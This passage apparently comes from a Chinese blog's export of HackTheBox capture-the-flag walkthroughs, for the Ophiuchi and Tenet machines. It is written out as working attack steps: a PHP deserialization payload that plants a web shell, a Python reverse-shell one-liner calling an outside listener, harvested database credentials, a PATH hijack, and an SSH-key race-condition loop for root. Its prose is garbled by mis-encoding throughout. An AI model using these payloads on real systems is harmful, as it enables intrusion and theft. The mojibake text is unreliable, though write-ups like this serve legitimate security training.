whythereisalimit\n```\næˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹è¿™å°æœºå™¨çš„è´¦æˆ·\n\n![](Hackthebox-Ophiuchi/7620f6a9-e804-450d-894b-e5378b0e340f.png)\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¿™å°linuxçš„æœºå™¨ä¸Šï¼Œadminå±…ç„¶æ˜¯ä¸€ä¸ªè´¦æˆ·ï¼Œè€Œä¸”æƒé™è¿˜ä¸ä½ï¼Ÿå‡ºé¢˜äººæ‰£ååˆ† è®°å¤§è¿‡ä¸€æ¬¡\n\nå’±ä»¬ç›´æ¥ä½¿ç”¨suè¿›è¡Œç™»å½•æˆ–ä½¿ç”¨sshè¿›è¡Œç™»å½•å³å¯\n\n![](Hackthebox-Ophiuchi/83b665cd-06ff-4292-b05b-1352e56e401c.png)\n\n![](Hackthebox-Ophiuchi/dfe0645f-3e73-4712-b796-e2181c60f15d.png)\n\næˆåŠŸæ‹¿åˆ°useræƒé™çš„flag\n\n# æƒé™æå‡\nä½¿ç”¨sudo -læŸ¥çœ‹å’±ä»¬çš„sudoæƒé™\n\n![](Hackthebox-Ophiuchi/20433e2b-d9ad-44c1-a3fd-f1b1236b9994.png)\n\nå’±ä»¬å‘ç°ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨rootæƒé™æ‰§è¡Œ/opt/wasm-functions/index.goæ–‡ä»¶ï¼Œé‚£ææƒçš„çªç ´å£è‚¯å®šåœ¨è¿™äº†ï¼Œå’±ä»¬æŸ¥çœ‹ä¸€ä¸‹å§\n\n![](Hackthebox-Ophiuchi/1dd916a3-c826-4e51-9740-a4d9f90b2e54.png)\n\nè¿›è¡Œä»£ç å®¡è®¡ï¼Œå’±ä»¬å¯ä»¥çœ‹åˆ°ã€‚å®ƒä¼šè¯»å–Webç¨‹åºé›†äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç„¶åå®ƒä¼šä»infoå‡½æ•°ä¸­è·å–ä¸€ä¸ªå€¼ï¼Œå¦‚æœè¯¥å€¼ä¸ç­‰äº1ï¼Œç¨‹åºå°†ä¼šè¾“å‡ºâ€œNot ready to deployâ€ï¼Œä¸ç„¶å°†ä¼šæ‰§è¡Œä¸€ä¸ªdeploy.shè„šæœ¬\n\næœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„ï¼Œ main.wasm å’Œ deploy.sh åœ¨æºä»£ç ä¸­æ²¡æœ‰ç»å¯¹è·¯å¾„ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥åˆ›å»ºè‡ªå·±çš„æ–‡ä»¶ï¼Œç„¶åä½¿ç”¨ PATH å˜é‡ã€‚ æ‰€ä»¥é¦–å…ˆæˆ‘è¦ä¸‹è½½ main.wasm åˆ°æˆ‘çš„æœºå™¨ä¸Š\n\nåœ¨ç›®æ ‡æœºå™¨ç›®å½•/opt/wasm-functionsç›®å½•ä¸­ä½¿ç”¨Python3å¼€å¯ä¸€ä¸ªæœåŠ¡å™¨\n\n![](Hackthebox-Ophiuchi/31f233b9-828c-4253-9adc-981211e9652e.png)\n\nç„¶åä½¿ç”¨wgetä¸‹è½½\n\n![](Hackthebox-Ophiuchi/797a4f37-cc84-46cb-92fc-29dc7af4fb2e.png)\n\n> [https://github.com/LucifielHack/wabt](https://github.com/LucifielHack/wabt)\n\nè¿™é‡Œä½¿ç”¨ä¸€ä¸ªåä¸ºwabt(Web Assembly Binary Toolkit)çš„å·¥å…·ï¼Œæˆ‘ä»¬éœ€è¦å°†main.wasmæ–‡ä»¶è½¬æ¢ä¸º.watæ–‡ä»¶ï¼Œå› ä¸ºå®ƒæ˜¯è¯¥äºŒè¿›åˆ¶æ–‡ä»¶çš„æ–‡æœ¬æ ¼å¼ã€‚ä½†åœ¨æ­¤ä¹‹å‰é¦–å…ˆè®©æˆ‘ä»¬ä½¿ç”¨wasm-decompileæŸ¥çœ‹äºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„infoå‡½æ•°ï¼Œå®ƒå°†äºŒè¿›åˆ¶æ–‡ä»¶åç¼–è¯‘ä¸ºCè¯­è¨€çš„æ ¼å¼\n\n```bash\n./wabt/build/wasm-decompile main.wasm -o main.dcmp\n```\n![](Hackthebox-Ophiuchi/0592ab35-2de8-41cf-99c9-e1695cca12ce.png)\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¯¥infoå‡½æ•°è¿”å›å€¼0ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬è¦ä¿®æ”¹çš„å†…å®¹äº†\n\nå°†.wasmè½¬æ¢ä¸º.watæ–‡ä»¶\n\n```bash\n./wabt/build/wasm2wat main.wasm -o main.wat\n```\n![](Hackthebox-Ophiuchi/82c8f524-eb44-493c-8929-92b3d8148b96.png)\n\nç„¶åæ‰“å¼€main.watæ–‡ä»¶\n\n![](Hackthebox-Ophiuchi/fd7957cb-5d3e-48eb-8c96-3cff495d8975.png)\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°constå€¼ä¸º0\n\næˆ‘ä»¬å°†å®ƒæ”¹ä¸º1\n\nç°åœ¨æˆ‘ä»¬éœ€è¦ä¿®æ”¹å›äºŒè¿›åˆ¶å½¢å¼(.wasm) å› æ­¤æˆ‘ä»¬éœ€è¦å°†.watè½¬æ¢ä¸º.wasm\n\n```bash\n./wabt/build/wat2wasm main.wat -o main.wasm\n```\n![](Hackthebox-Ophiuchi/b19efc93-d4e6-4c84-81d8-06e5959168ec.png)\n\nå°†main.wasmä¸Šä¼ åˆ°/tmpç›®å½•\n\n![](Hackthebox-Ophiuchi/3df470b1-4aee-42fe-bd5e-65828c0c970b.png)\n\nå’±ä»¬åˆ¶ä½œä¸€ä¸ªdeploy.shæ–‡ä»¶åœ¨/tmpç›®å½•\n\n![](Hackthebox-Ophiuchi/e3a4e5d8-691e-4576-98fd-a1521a0b44cc.png)\n\nç°åœ¨æ·»åŠ /tmpåˆ°PATHå˜é‡å¹¶ä»¥sudoçš„å½¢å¼è¿è¡Œgolangæºä»£ç \n\n```bash\nexport PATH=/tmp:$PATH\necho $PATH\n```\n![](Hackthebox-Ophiuchi/776d0636-eb2f-4262-bd74-02dec07b882d.png)\n\n![](Hackthebox-Ophiuchi/f9e1d7d9-c073-4698-956d-d1acc9742c76.png)\n\nå¤§å®¶å¯ä»¥çœ‹åˆ°ï¼Œå·²ç»è¿è¡ŒæˆåŠŸäº†ï¼Œç›´æ¥ä½¿ç”¨bash -pè¿›è¡Œææƒå³å¯\n\n![](Hackthebox-Ophiuchi/4a2b916b-955e-447a-95dd-44194c798cbc.png)\n\nææƒæˆåŠŸ\n\n![](Hackthebox-Ophiuchi/a4a5d501-2fda-4870-b46d-bd68c5834b4b.png)\n\næˆåŠŸè·å¾—rootæƒé™çš„flag\n\næ”¶å·¥ç¡è§‰","tags":["Hackthebox"]},{"title":"Tenet - Hackthebox","url":"/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/","content":"\n# Hackthebox - Tenet\n**Hackthebox - Tenet é¶åœºå®æˆ˜**\n\n**é¶åœºä¿¡æ¯**\n\n![](Hackthebox-Tenet/052e12b1-d487-454a-96ea-6cb1d819c2d7.png)\n\n**é¶åœºç±»å‹**\n\n![](Hackthebox-Tenet/e26be302-dfe3-4c5f-8ee2-9cf4dd4c513e.png)\n\n**ä¿¡æ¯æœé›†**\n\né¦–å…ˆä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ\n\nnmap -A -sS -sC -sV 10.10.10.223\n\n![](Hackthebox-Tenet/917d4824-d2ed-4bb3-98e7-02b596d30dc5.png)\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæœ¬å°é¶åœºå¼€å¯äº†22å’Œ80ç«¯å£ï¼Œå’±ä»¬è®¿é—®80ç«¯å£çœ‹çœ‹\n\n![](Hackthebox-Tenet/510b16ce-e566-4cee-9b1c-3fa47b010102.png)\n\nè®¿é—®80ç«¯å£åå‘ç°æ˜¯ä¸€ä¸ªapache2çš„é»˜è®¤é¡µé¢ï¼Œé‚£å°±å¯ä»¥ç¡®å®šæ˜¯apacheçš„æ¼æ´å…¥æ‰‹äº†\n\nç®€å•æŸ¥çœ‹äº†ä¸€ä¸‹ï¼Œæ²¡æœ‰å…¶ä»–å•¥ä¸œè¥¿ï¼Œå’±ä»¬å…ˆçˆ†ä¸ªç›®å½•å§\n\næ‡’å¾—ä½¿ç”¨é¼ æ ‡äº†ï¼Œæ‰€ä»¥è¿™é‡Œå’±ä»¬ä½¿ç”¨gobusterè¿›è¡Œçˆ†ç ´\n\ngobuster dir -u http://10.10.10.223 -x php,log,txt -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --wildcard -o gob\n\n![](Hackthebox-Tenet/1d1057cd-a1c1-4815-837d-30878bb41e4a.png)\n\næ‰¾åˆ°äº†ä¸€ä¸ªæ–‡ä»¶ä¸€ä¸ªç›®å½•\n\n/users.txt\n\n/wordpress\n\nå’±ä»¬å…ˆçœ‹çœ‹/users.txtæ–‡ä»¶\n\n![](Hackthebox-Tenet/22450566-01f0-4d3a-bee9-e719ce6a9e13.png)\n\nå¾—åˆ°äº†ä¸€ä¸ªç”¨æˆ·åSuccessï¼Œå…ˆè®°å½•ä¸‹æ¥ï¼Œå’±ä»¬å»çœ‹çœ‹wp\n\n![](Hackthebox-Tenet/8802405b-2c02-4328-b5a3-4c97deee5090.png)\n\nå˜›ç©æ„å„¿ï¼Ÿä½ å‘Šæˆ‘è¿™æ˜¯wordpressï¼Ÿæˆ‘éƒ½å‡†å¤‡å¥½ç ¸expäº†ç»“æœä½ å‘Šè¯‰æˆ‘è¿™ï¼Ÿ\n\n![](Hackthebox-Tenet/41c08274-6a77-4b1a-976b-c9938649309b.png)\n\nç¿»äº†ä¸€ä¸‹ç½‘é¡µæºä»£ç ï¼Œåœ¨cssé‡Œå‘ç°äº†ä¸€ä¸ªåŸŸåtenet.htbï¼Œæˆå§ï¼Œè¿˜æ˜¯å¾—å»/etc/hostsé‡Œæ·»åŠ ä¸€ä¸ªè§£æã€‚\n\nvim /etc/hosts\n\n![](Hackthebox-Tenet/195b271b-532e-405e-a4f7-008e88c29081.png)\n\n![](Hackthebox-Tenet/a5902ad7-b1af-4e5d-9e2a-2885cff75b7c.png)\n\næ·»åŠ åå†è®¿é—®å°±å¯¹åŠ²äº†\n\n![](Hackthebox-Tenet/72ef8706-0f0b-46eb-b711-5a10e9b11792.png)\n\nè¿™é‡Œå‘ç°æœ‰ä¸€äº›æ–‡ç« ï¼Œä½†æ˜¯æˆ‘è¿™å°å­¦è‹±è¯­éƒ½ä¸åŠæ ¼çš„æ°´å¹³â€¦æ²¡åŠæ³•ï¼Œå¼€ç¿»è¯‘å™¨å§\n\nç„¶åæˆ‘ä»¬åœ¨å…¶ä¸­ä¸€ç¯‡ã€ŠMigrationã€‹ä¸Šï¼Œæ‰¾åˆ°äº†ä¸€æ¡è¯„è®º\n\n![](Hackthebox-Tenet/76168e08-a677-4477-8e83-6584b37021e2.png)\n\nç»è¿‡æœºç¿»+æˆ‘ä¸ªäººçš„ç†è§£åï¼Œå¤§è‡´æ„æ€å¦‚ä¸‹ï¼š\n\nä½ æ˜¯å¦åˆ é™¤äº†sator.phpçš„å¤‡ä»½æ–‡ä»¶ï¼Ÿè¿ç§»æ–‡ä»¶ä¸å®Œæ•´ï¼Œä½ ä¸ºå•¥è¦è¿™æ ·åšï¼Ÿä½ å›¾å•¥ï¼Ÿï¼ˆæœ€åä¸€å¥æˆ‘è‡ªå·±åŠ çš„ï¼Œæ–‡é‡Œæ²¡æœ‰ï¼‰\n\næ•´ç†ä¸€ä¸‹ç›®å‰æˆ‘ä»¬å¾—åˆ°çš„ä¿¡æ¯\n\nä¸¤ä¸ªç”¨æˆ·ï¼Œåˆ†åˆ«ä¸ºneilå’Œç®¡ç†å‘˜protagonistï¼ˆçŒœæµ‹ï¼Œè¯æ®å¦‚ä¸‹å›¾ï¼‰\n\n![](Hackthebox-Tenet/7da31670-8c15-4117-933d-1835f04a5b77.png)\n\nå’Œä¸€ä¸ªphpæ–‡ä»¶ sator.php\n\næ€è·¯æ•´ç†ï¼Œç”¨æˆ·neilè´¨é—®ç®¡ç†å‘˜ä¸ºä»€ä¹ˆåœ¨è¿ç§»webç¨‹åºçš„æ—¶å€™åˆ é™¤äº†sator.phpä»è€Œå¯¼è‡´äº†ç½‘ç«™æ–‡ä»¶ä¸å®Œæ•´ï¼Œä¹Ÿå°±æ˜¯è¯´wordpressç›®å½•ä¸‹æ˜¯ä¸å¯èƒ½å­˜åœ¨è¿™ä¸ªæ–‡ä»¶çš„ã€‚ä½†æ˜¯å’±ä»¬åˆè¦åˆ©ç”¨åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œé‚£åœ¨ä¸€å¼€å§‹çš„apache2ç›®å½•ä¸‹å°è¯•ä¸€ä¸‹ï¼Ÿ\n\n![](Hackthebox-Tenet/d2677dfb-581d-4c65-a9ac-254f924a6678.png)\n\nä¼¼ä¹æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼Œæˆ‘åˆå›å»çœ‹äº†ä¸€ä¸‹neilç”¨æˆ·çš„è¯„è®ºã€‚\n\nç­‰ç­‰ï¼Ÿå¤‡ä»½æ–‡ä»¶ï¼Ÿé‚£æ„æ€å°±æ˜¯bakæ–‡ä»¶ï¼Ÿå’±ä»¬å°è¯•ä¸€ä¸‹\n\n![](Hackthebox-Tenet/812e216b-f58f-455a-9b7a-fc9f0fda06ce.png)\n\næˆ‘å¯çœŸæ˜¯å¤ªæ£’äº†ï¼Œç°åœ¨æ˜¯å‡Œæ™¨å››ç‚¹ï¼Œå¥–åŠ±è‡ªå·±ä¸€é¡¿çƒ§çƒ¤ï¼Œé•¿èƒ–äº†éƒ½æ˜¯ä½ ä»¬çš„è´£ä»»ï¼Œè®°å¾—èƒŒé”…\n\n![](Hackthebox-Tenet/bc98f7d1-8cae-4d46-b9d7-f2579498d0d5.png)\n\næˆåŠŸæåˆ°ä¸€ä»½phpæºç ï¼Œå®¡è®¡å§ã€‚\n\nä½†æ˜¯å§ï¼Œå®¡è®¡ç¡®å®æ˜¯æˆ‘çš„çŸ­æ¿ï¼Œæ‰€ä»¥æ€ä¹ˆåŠå‘¢ï¼Ÿè¿™ä¸ªæ—¶å€™ä¸¢ç»™â€œæœ‹å‹â€å°±å¥½äº†ï¼Œè€ç™½å«–äº†\n\n**åŸç†è®²è§£**\n\næˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œçœ‹åˆ°ï¼Œæœ‰ä¸€ä¸ªç±» DatabaseExportï¼Œå…¶ä¸­æœ‰ä¸¤ä¸ªå…¬å…±å˜é‡ user\\_fileã€data å¹¶ä¸”åœ¨è¿™ä¸ªç±»ä¸­ï¼Œæœ‰ä¸€ä¸ªå…¬å…±å‡½æ•°è¢«è°ƒç”¨ update\\_db()ï¼Œè¯¥å‡½æ•°å°† data å˜é‡è®¾ç½®ä¸ºâ€œSuccessâ€ï¼Œè¿™åªæ˜¯ä¸€ä¸ªtxtæ–‡ä»¶ï¼Œæ­£å¦‚ä½ ä» sator.php ä¸­çœ‹åˆ°çš„é‚£æ ·ï¼Œæœ€åçš„ç½‘ç»œæµè§ˆå™¨æœ‰ä¸€ä¸ªmagicå‡½æ•°ï¼ˆè¿™ä¸ªæ‰¾èµ„æ–™çš„æ—¶å€™çœ‹åˆ°çš„ï¼Œä½†æˆ‘ä¸çŸ¥é“æ€ä¹ˆç¿»è¯‘ï¼‰\\_\\_destruct()ï¼Œå½“ä¸€ä¸ªå¯¹è±¡è¢«é”€æ¯æ—¶ï¼Œå®ƒä¼šè‡ªåŠ¨è°ƒç”¨ user\\_file å°†ä½¿ç”¨æ¥è‡ª data çš„å†…å®¹å¹¶å°†å…¶æ”¾å…¥webç›®å½•ä¸­ï¼Œè¿™æ„å‘³ç€åœ¨webç›®å½•ä¸­åˆ›å»º users.txt æ•°æ®â€œSuccessâ€ã€‚\n\næœ€åæˆ‘ä»¬å¯ä»¥ GET å‚æ•° arepoï¼Œç°åœ¨è¿™é‡Œå­˜åœ¨ä¸€ä¸ªæ¼æ´ï¼Œç§°ä¸ºâ€œPHPååºåˆ—åŒ–â€\n\nå› æ­¤ï¼Œè¦åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬å¿…é¡»ä¿®æ”¹åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç±»å˜é‡ user\\_fileï¼Œå¹¶å°† data åºåˆ—åŒ–ï¼Œä¸€æ—¦æˆ‘ä»¬å¾—åˆ°äº†åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬æŠŠå®ƒä¼ é€’ç»™ arepo å‚æ•°ä¸­ã€‚\n\n**æ¼æ´åˆ©ç”¨**\n\nè™½ç„¶æˆ‘ä»£ç å®¡è®¡å¾ˆå¼±ï¼Œä½†æˆ‘å¤§æ¦‚çœ‹æ‡‚äº†ï¼Œå®ƒç”Ÿæˆäº†ä¸€ä¸ªåä¸ºusers.txtçš„æ–‡ä»¶ï¼Œå†…å®¹ä¸ºSuccessï¼Œé‚£å’±ä»¬è®©ä»–ç”Ÿæˆphpæ–‡ä»¶ç„¶åå†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œè¿™ä¸å°±æˆäº†ï¼Ÿ\n\nè¿™ä¸å°±æ˜¯å¦¥å¦¥çš„phpååºåˆ—åŒ–å—ï¼Ÿ\n\nä»£ç \n\n';\n\n}\n\n\\$test = serialize(new DatabaseExport);\n\necho \\$test;\n\n?>\n\nå°†ä¸Šé¢çš„ä»£ç ä¿å­˜ä¸ºphpæ–‡ä»¶ï¼Œç„¶åæ‰§è¡Œåä¼šå¾—åˆ°ä¸€ä¸ªphpåºåˆ—åŒ–\n\n![](Hackthebox-Tenet/82445885-959a-4e87-b66b-60e312f62434.png)\n\nç„¶åæˆ‘ä»¬éœ€è¦ä»¥urlç¼–ç çš„å½¢å¼æŠŠå®ƒä¼ é€’ç»™ GET å‚æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨cyberchefï¼ˆæˆ–å…¶ä»–å·¥å…·ï¼‰æ¥å®Œæˆ\n\n[https://gchq.github.io/CyberChef/#recipe=URL\\_Encode(false)](https://gchq.github.io/CyberChef/#recipe=URL_Encode(false))\n\n![](Hackthebox-Tenet/76ded797-b7b3-4f60-bc35-be843a330dce.png)\n\nO:14:%22DatabaseExport%22:2:%7Bs:9:%22user\\_file%22;s:9:%22shell.php%22;s:4:%22data%22;s:29:%22%3C?php%20system(\\$\\_GET%5B%22cmd%22%5D);?%3E%22;%7D\n\nå’±ä»¬é€šè¿‡ GET ä¼ è¾“ï¼Œç›´æ¥ç²˜è´´åˆ°urlé‡Œ\n\n[http://10.10.10.223/sator.php?arepo=O:14:%22DatabaseExport%22:2:%7Bs:9:%22user\\_file%22;s:9:%22shell.php%22;s:4:%22data%22;s:29:%22%3C?php%20system(\\$\\_GET%5B%22cmd%22%5D);?%3E%22;%7D](http://10.10.10.223/sator.php?arepo=O:14:%22DatabaseExport%22:2:%7Bs:9:%22user_file%22;s:9:%22shell.php%22;s:4:%22data%22;s:29:%22%3C?php%20system($_GET%5B%22cmd%22%5D);?%3E%22;%7D)\n\n![](Hackthebox-Tenet/309140ae-90f9-44ef-9a4d-b0367be53ae4.png)\n\næç¤ºå·²ç»æ›´æ–°äº†ï¼Œé‚£å°±æ˜¯æˆåŠŸäº†\n\n![](Hackthebox-Tenet/7ee24b68-d72c-4e3f-8a5c-32ee37880c75.png)\n\næˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼Œæˆ‘ä»¬æ‹¿åˆ°äº†ä¸€ä¸ªwebshell\n\nç†Ÿæ‚‰æˆ‘çš„è¯»è€…ä»¬éƒ½çŸ¥é“ï¼Œæˆ‘æ¯”è¾ƒå–œæ¬¢åˆ©ç”¨python3\n\næ‰€ä»¥å’±ä»¬ç›´æ¥çœ‹çœ‹æ˜¯å¦å­˜åœ¨python3\n\n![](Hackthebox-Tenet/fa4bc5e7-01a0-4afc-ae9c-657a66a2b170.png)\n\nå“¦è± å­˜åœ¨python3ï¼Œè¿™æ˜¯ä¸€ä»¶å¾ˆå¹¸è¿çš„äº‹æƒ…\n\nå’±ä»¬ç›´æ¥ç”¨python3è¿›è¡Œåå¼¹shell\n\næœ¬åœ°ç›‘å¬4444ç«¯å£\n\n![](Hackthebox-Tenet/013c36bf-378f-4e5c-af8c-6064ce6fd756.png)\n\nhttp://10.10.10.223/shell.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF\\_INET,socket.SOCK\\_STREAM);s.connect((\"10.10.14.184\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'\n\n![](Hackthebox-Tenet/f83eedae-42d6-4040-acb8-68daeeb7eb2a.png)\n\næˆåŠŸå¾—åˆ°äº†ä¸€ä¸ªç¨³å®šçš„shellï¼ŒèŠœæ¹–ï¼Œèµ·é£\n\nç”±äºæˆ‘ä»¬ç°åœ¨åªæ˜¯www-dataç”¨æˆ·ï¼Œæƒé™ä½çš„å¾ˆï¼Œç°åœ¨è¿˜å¾—å…ˆè·å–åˆ°ä¸€ä¸ªæ­£å¸¸çš„ç”¨æˆ·\n\n![](Hackthebox-Tenet/e64831ef-31e4-4efc-bb62-24d44448d847.png)\n\nå’±ä»¬æ£€æŸ¥ä¸€ä¸‹cronçš„å·¥ä½œ\n\n![](Hackthebox-Tenet/45c3c0c8-98a1-40b3-927c-15de5fcac111.png)\n\næ£€æŸ¥ä¸€ä¸‹å¼€æ”¾çš„ç«¯å£\n\nå·²ç»æœ‰æ€è·¯äº†å•Šå…„å¼Ÿä»¬\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°3306ç«¯å£åœ¨æˆ‘ä»¬æœ¬åœ°è¿è¡Œç€ï¼Œé‚£å¤šåŠå°±æ˜¯mysqläº†ï¼Œå’±ä»¬ç›´æ¥æ‰¾mysqlçš„é…ç½®æ–‡ä»¶å•Š\n\næˆ‘è®°å¾—æˆ‘ä»¥å‰æ‰“è¿‡å¾ˆå¤šwordpressçš„ç«™ï¼ˆæŠ±æ­‰ï¼Œéƒ½æ˜¯æ¶‰å¯†é¡¹ç›®ï¼Œæ‰€ä»¥ä¸æ–¹ä¾¿å†™æˆæ–‡ç« ï¼‰ï¼Œåœ¨wp-config.phpæ–‡ä»¶é‡Œï¼Œä¸€èˆ¬ä¼šæœ‰æ•°æ®åº“çš„è´¦å·å¯†ç çš„ï¼Œå’±ä»¬å»è¯»å–è¯•è¯•\n\n![](Hackthebox-Tenet/2273a301-6e35-470f-9ef3-5c40c0950f74.png)\n\næˆåŠŸæ‹¿åˆ°\n\nDB\\_NAME = wordprss\n\nDB\\_USER = neil\n\nDB\\_PASSWORD = Opera2112\n\n![](Hackthebox-Tenet/c5b21ad5-d79e-4d50-939e-99226e18255e.png)\n\nç™»é™†å¤±è´¥ï¼Ÿé‚£è¿™æš—ç¤ºå°±å¾ˆæ˜æ˜¾äº†ï¼Œåº”è¯¥æ˜¯ä¸€ä¸ªç”¨æˆ·äº†ï¼Œå’±ä»¬çœ‹çœ‹å»ï¼Œ\n\n![](Hackthebox-Tenet/70e5b2a7-4b5c-444c-a521-812740adc06e.png)\n\nç­‰ä¼šå„¿ï¼Ÿæˆ‘ä»¥ä¸ºè¿™æ˜¯ä¸€ä¸ªæ•°æ®åº“ç”¨æˆ·ï¼Œæ²¡æƒ³åˆ°æƒé™è¿˜æŒºå¤§ï¼Ÿ\n\nå’±ä»¬ç›´æ¥ç™»å½•å§\n\n![](Hackthebox-Tenet/e3601cf5-5ee5-4573-8ca2-9d706bc49349.png)\n\nç™»å½•æˆåŠŸ\n\n![](Hackthebox-Tenet/5a7c71ed-46fc-4538-906e-d20ac17a1927.png)\n\næˆåŠŸæ‹¿åˆ°useræƒé™çš„flag\n\n**æƒé™æå‡**\n\nå’±ä»¬è€è§„çŸ©ï¼Œsudo -læŸ¥çœ‹ä¸€ä¸‹sudoæƒé™\n\n![](Hackthebox-Tenet/c73c01db-e931-4914-9a50-d09c51c3ccc9.png)\n\nå‘ç°å¯ä»¥ç›´æ¥ç”¨rootæƒé™æ‰§è¡ŒenableSSH.shæ–‡ä»¶ï¼Œé‚£ææƒè¿˜ä¸ç®€å•ï¼Ÿåœ¨æ ¹ç›®å½•ä¸‹æœ¬æ¥å°±å­˜åœ¨ä¸€ä¸ªexp.shï¼Œè¿™ä¸æç¤ºå°±æ¥äº†ï¼Ÿå’±ä»¬æŸ¥çœ‹ä¸€ä¸‹\n\n![](Hackthebox-Tenet/be744f9d-7f9e-4070-bf01-90f99b38c270.png)\n\næˆ‘æ€ä¹ˆçœ‹ç€æœ‰ç‚¹ä¸å¯¹åŠ²å‘¢ã€‚ã€‚ã€‚\n\nåœ¨è¿Ÿç–‘äº†å¤§æ¦‚1.25ç§’åï¼Œæˆ‘æ‚Ÿäº†ï¼\n\nè¿™TMæ˜¯å…¶ä»–å“¥ä»¬å„¿åšè¿‡åç•™ä¸‹çš„ææƒè„šæœ¬ï¼è¿™æ ¹æœ¬å°±ä¸æ˜¯æˆ‘è¦çš„ä¸œè¥¿ï¼\n\næˆ‘ä¸¢å•Šï¼Œç¨ç­‰å„ä½ï¼Œæˆ‘å…ˆé‡ç½®ä¸€ä¸‹é¶åœºï¼Œå†æ¥ä¸€æ¬¡\n\ncat /usr/local/bin/enableSSH.sh\n\n![](Hackthebox-Tenet/c9bf7956-8bd6-47fa-ad21-d7eb0ed00b92.png)\n\næŸ¥çœ‹è¿™ä¸ªshæ–‡ä»¶æ‰å¯¹ï¼Œåˆšæ‰æé”™äº†ï¼Œè¯·å¤§å®¶æ— è§†å“ˆ\n\nè¿™äº›å†…å®¹éƒ½æ¯”è¾ƒæ— èŠï¼Œå’±ä»¬ç›´æ¥æ‹‰åˆ°æœ€åº•ä¸‹\n\n![](Hackthebox-Tenet/e0306962-583f-490b-a657-6bf6a06c9e03.png)\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€ä¸ªaddkey()ä½¿ç”¨å‘½ä»¤åˆ›å»ºä¸´æ—¶æ–‡ä»¶çš„å‡½æ•°mktemp\n\n![](Hackthebox-Tenet/8e2b1fbc-ff18-43e5-8fdc-54e70d9b0c93.png)\n\nå¦‚æœæˆ‘ä»¬åœ¨æœ¬åœ°æœºå™¨ä¸Šè¿è¡Œæ­¤å‘½ä»¤æŸ¥çœ‹å®ƒç”Ÿæˆçš„æ–‡ä»¶åï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ¯æ¬¡è¿è¡Œæ­¤å‘½ä»¤æ—¶ï¼Œæ–‡ä»¶åéƒ½æ˜¯ä¸ä¸€æ ·çš„\n\nmktemp -u /temp/ssh-XXXXXX\n\n![](Hackthebox-Tenet/9b8b4d9a-eb01-451b-bde1-97247a36efe5.png)\n\næ‘¸äº†æ‘¸æˆ‘å¹¶ä¸å­˜åœ¨çš„å¤´å‘ï¼Œè¿™ç©æ„å„¿çœŸè®©äººå¤´ç§ƒ\n\nå…¬å…±å¯†é’¥è·å–æ–¹æ³•\n\nssh-keygen ç„¶åæ ¹æ®æˆ‘ä»¬è‡ªå·±çš„æƒ…å†µè¿›è¡Œè®¾ç½®ï¼Œç„¶åæ–‡ä»¶ä¿å­˜åœ¨/root/.ssh/id-rsa.pubä¸­\n\nå°†å¦‚ä¸‹ä»£ç ä¿å­˜åˆ°exp.shæ–‡ä»¶\n\nwhile true\n\ndo\n\necho 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDoVUNa8uk2pi8tECc1c6SsFbq1xlNvnhwzqgEjmN6yyp8u7TIC4VbzgyRC2UnN9dM0wn9mP103gIAxLGXxgy5kl+cquFffZPoOjfd9I4ZLFDHaPr6eXbXSCg445UXG1gAj8b7lPGemz6vApGrlMGjl1TABKMBHCTbzqSVoAxaDZXSiF4kIKKU4b2Dx8Uw7XgTdd+KWZnuIozuYyZlD3+cl//inLetupgpP0ZBvcBqAr1UqtCxsMx2Yzy3XfQ/VQMW4Qeswuvx98P+kP6wqpq2jXxaEoRkyVcIlQekJg1W+XwuuNixQeli7CQQBgqu7FwUYrftlWZm0br3HNQlVwBgB+zqExOmt8iktcHjw3pLetwI7X7sdB5pUS4QN2hwDDQsAuhaGMt4MAWSLKsgEZJxWT4FTH2R5+eTCXZNbH97aGbH0/ONmzZFKm9bOwvnflQ5taIe149JbuPMc6sba5C4FROHagprucjaPDYhp/v0q0ztKq2G9Ay5yfCTTFj5sYuk= root@root' |tee /tmp/ssh-\\*\n\ndone\n\n![](Hackthebox-Tenet/1a888b74-7bfe-4800-83ac-7bd83c678b42.png)\n\næ·»åŠ è¿è¡Œæƒé™ chmod +x exp.sh\n\nç„¶åè¿è¡Œ./exp.sh\n\nç„¶åå’±ä»¬å†å¼€ä¸€ä¸ªsshè¿æ¥\n\nç„¶åå’±ä»¬åœ¨æ–°å¼€çš„sshè¿æ¥ä¸Šè¿è¡Œâ€™ sudo /usr/local/bin/enableSSH.shâ€™å‡ æ¬¡\n\n![](Hackthebox-Tenet/ebd0886d-924b-4668-a864-d7100ab2925f.png)\n\nç„¶åå’±ä»¬æµ‹è¯•ä¸€ä¸‹æ˜¯å¦å¯ä»¥è¿æ¥\n\nssh [root@10.10.10.223](mailto:root@10.10.10.223) -i 